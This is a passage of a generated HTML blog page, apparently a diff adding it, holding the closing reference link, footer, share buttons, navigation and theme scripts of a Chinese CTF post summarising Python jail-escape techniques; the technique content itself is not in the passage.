+<p><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets</a></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-10-14</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/pyjail_summury/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\PyJail_Summury.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\PyJail_Summury.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20PyJail%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93&body=|Field|Value|%0A|-|-|%0A|Title|PyJail%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93|%0A|Url|http://scofield1920.github.io/pyjail_summury/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\PyJail_Summury.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/pyjail_summury/" data-title="PyJail姿势总结" data-hashtags="misc,manual"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/pyjail_summury/" data-hashtag="misc"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/pyjail_summury/" data-title="PyJail姿势总结"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/pyjail_summury/" data-title="PyJail姿势总结"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/pyjail_summury/" data-title="PyJail姿势总结"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/pyjail_summury/" data-title="PyJail姿势总结" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;PyJail姿势总结&#34;, &#34;http://scofield1920.github.io/pyjail_summury/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/misc/">Misc</a>,&nbsp;<a href="/tags/manual/">Manual</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hnctf_pyjail/" class="prev" rel="prev" title="HNCTF_PyJail练习"><i class="fas fa-angle-left fa-fw"></i>HNCTF_PyJail练习</a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.124.1">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
